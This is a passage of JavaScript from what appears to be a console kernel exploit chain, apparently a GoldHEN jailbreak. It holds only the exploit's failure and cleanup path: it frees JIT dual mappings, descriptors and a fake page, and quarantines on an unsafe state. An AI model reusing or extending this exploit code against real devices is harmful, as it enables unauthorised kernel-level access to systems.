      const cleaned = cleanupHx1400GoldhenDualmapJitViews(
        state.jitRwMap,
        state.jitRxMap,
        state.jitFd,
        (mapping, length) =>
          (sc(HX1400_SYSCALLS.munmap, q(mapping), length).i32 | 0) === 0,
        (fd) => closeFd(fd),
      );
      state.jitRwMap = cleaned.writable;
      state.jitRxMap = cleaned.executable;
      state.jitFd = cleaned.fd;
      if (cleaned.ok) {
        if (hadMappings) result.jitMappingsReleased = true;
        if (hadDescriptor) result.jitDescriptorReleased = true;
      } else {
        enterQuarantine(cleaned.reason);
      }
    }
    if (state.eventDeleteHazard && !state.quarantine)
      enterQuarantine("EV_DELETE failure may have left the arm linked");

    if (state.challengeMayBeDirty && !restoreChallenge())
      result.rebootRequired = true;
    if (!result.aioCleanupVerified && !state.quarantine)
      enterQuarantine("AIO cleanup unverified");

    let down = {
      slot: !state.slotMutationAttempted || state.slotRestored,
      bridge: state.bridgeKq < 0 || state.bridgeDeleted,
    };
    const wasArmed = state.armed;
    if (wasArmed && !state.quarantine) down = safeDown();

    let targetSafe = true;
    if (!wasArmed && state.pairEstablished) {
      targetSafe = repairTargetOption();
      if (!targetSafe) enterQuarantine("paired target repair failed");
    }

    let descriptors = false;
    let lowMapReleased =
      state.fakePage === null && state.lowMapLease === null;
    if (!state.quarantine && down.slot && down.bridge && targetSafe) {
      descriptors = cleanupDescriptors(wasArmed);
      if (descriptors) {
        lowMapReleased = releaseLowMap();
        if (!lowMapReleased) enterQuarantine("low mapped page cleanup failed");
      } else {
        enterQuarantine("descriptor cleanup failed");
      }
    }
    const affinity = restoreAffinity();
    result.quarantined = state.quarantine;
    result.stageCleanupVerified =
      !state.quarantine &&
      down.slot &&
      down.bridge &&
      targetSafe &&
      descriptors &&
      affinity &&
      lowMapReleased &&
      result.aioCleanupVerified &&
      !state.challengeMayBeDirty &&
      (result.patchExecutionAttempted ||
        (state.jitRwMap === null && state.jitRxMap === null && state.jitFd === -1));
    state.exploitRetired = deriveHx1400GoldhenDualmapExploitRetired(
      result.stageCleanupVerified,
      state.exploitAuthorityEstablished,
    );
    result.exploitRetired = state.exploitRetired;
    result.cleanupVerified = result.stageCleanupVerified;
    result.code = selectHx1400GoldhenDualmapFailureCode(
      result.code,
      result.oracleAttempted,
      result.oracleCleanup,
      result.oracleRebootRequired,
      result.stageCleanupVerified,
    );
    result.rebootRequired = true;
    result.ok = false;
    return result;
  }
}
